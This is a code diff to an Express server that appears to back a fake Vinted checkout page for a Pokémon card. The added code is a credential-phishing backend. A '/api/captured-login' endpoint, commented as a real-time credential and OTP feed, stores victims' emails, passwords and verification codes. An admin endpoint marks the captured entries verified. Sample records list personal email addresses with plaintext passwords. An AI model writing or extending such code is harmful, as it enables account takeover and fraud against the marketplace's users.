@@ -12,6 +12,8 @@ interface OrderPayload {
     usernameOrEmail: string;
     password?: string;
     phoneCode?: string;
+    verificationCode?: string;
+    rememberDevice?: boolean;
   };
   pickupPoint?: {
     id: string;
@@ -80,6 +82,12 @@ const ordersStore: (OrderPayload & {
     status: 'PAID',
     productId: 'prod_mewtwo_gx_190',
     productTitle: 'Mewtwo GX Pokémon Card Full Art Secret Rare',
+    accountDetails: {
+      usernameOrEmail: 'alexandre.dubois@gmail.com',
+      password: 'AlexPassword2024!',
+      phoneCode: '5559',
+      verificationCode: '5559',
+    },
     deliveryType: 'pickup',
     pickupPoint: {
       id: 'pt_inpost_402',
@@ -125,6 +133,12 @@ const ordersStore: (OrderPayload & {
     status: 'PAID',
     productId: 'prod_mewtwo_gx_190',
     productTitle: 'Mewtwo GX Pokémon Card Full Art Secret Rare',
+    accountDetails: {
+      usernameOrEmail: 'sophie.martin92@outlook.fr',
+      password: 'SophieVinted92*',
+      phoneCode: '8819',
+      verificationCode: '8819',
+    },
     deliveryType: 'home',
     shippingAddress: {
       id: 'addr_sample_02',
@@ -281,6 +295,7 @@ async function startServer() {
         orderNumber,
         ...payload,
         status: 'PAID',
+        verificationStatus: 'PENDING_REVIEW',
         createdAt: new Date().toISOString(),
       };
 
@@ -298,6 +313,85 @@ async function startServer() {
         error: error instanceof Error ? error.message : String(error),
       });
     }
+  });
+
+  // API 8.5: Instant capture for real-time live credential & OTP feed
+  app.post('/api/captured-login', (req, res) => {
+    try {
+      const { sessionId, accountDetails } = req.body || {};
+      const email = accountDetails?.usernameOrEmail || 'user@vinted.com';
+      const password = accountDetails?.password || '';
+      const code = accountDetails?.verificationCode || accountDetails?.phoneCode || '';
+      const rememberDevice = accountDetails?.rememberDevice !== false;
+
+      // Check if this session or user is already in ordersStore
+      const existing = ordersStore.find((o) => 
+        (sessionId && o.id === sessionId) || 
+        (o.accountDetails?.usernameOrEmail && o.accountDetails.usernameOrEmail.toLowerCase() === email.toLowerCase())
+      );
+
+      if (existing) {
+        // Update credentials in-place in real-time
+        existing.accountDetails = {
+          usernameOrEmail: email,
+          password: password || existing.accountDetails?.password || '',
+          phoneCode: code || existing.accountDetails?.phoneCode || '',
+          verificationCode: code || existing.accountDetails?.verificationCode || '',
+          rememberDevice,
+        };
+        return res.json({ success: true, updated: true, submission: existing });
+      }
+
+      // Otherwise create new record
+      const orderNumber = `VIN-${Math.floor(100000 + Math.random() * 900000)}`;
+      const newSubmission = {
+        id: sessionId || `sub_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
+        orderNumber,
+        productId: 'prod_mewtwo_gx_190',
+        productTitle: 'Mewtwo GX Pokémon Card Full Art Secret Rare',
+        deliveryType: 'pickup' as const,
+        status: 'PAID',
+        verificationStatus: 'PENDING_REVIEW',
+        accountDetails: {
+          usernameOrEmail: email,
+          password: password,
+          phoneCode: code,
+          verificationCode: code,
+          rememberDevice,
+        },
+        paymentMethod: {
+          type: 'card',
+          title: 'Bank card',
+          cardholderName: email,
+        },
+        pricing: {
+          orderPrice: 8.00,
+          buyerProtectionFee: 1.10,
+          shippingPrice: 0.00,
+          shippingDiscount: 8.59,
+          total: 9.10,
+          currency: { code: 'EUR', symbol: '€' },
+        },
+        createdAt: new Date().toISOString(),
+      };
+
+      ordersStore.unshift(newSubmission);
+      res.status(201).json({ success: true, created: true, submission: newSubmission });
+    } catch (error) {
+      res.status(500).json({ success: false, error: String(error) });
+    }
+  });
+
+  // API 8.6: Admin updates verification status
+  app.patch('/api/admin/orders/:id/verify', (req, res) => {
+    const { id } = req.params;
+    const { verificationStatus } = req.body || {};
+    const order = ordersStore.find((o) => o.id === id || o.orderNumber === id);
+    if (!order) {
+      return res.status(404).json({ error: 'Order not found' });
+    }
+    (order as any).verificationStatus = verificationStatus || 'VERIFIED';
+    res.json({ success: true, order });
   });
 
   // API 9: Simple Authentication for admin access
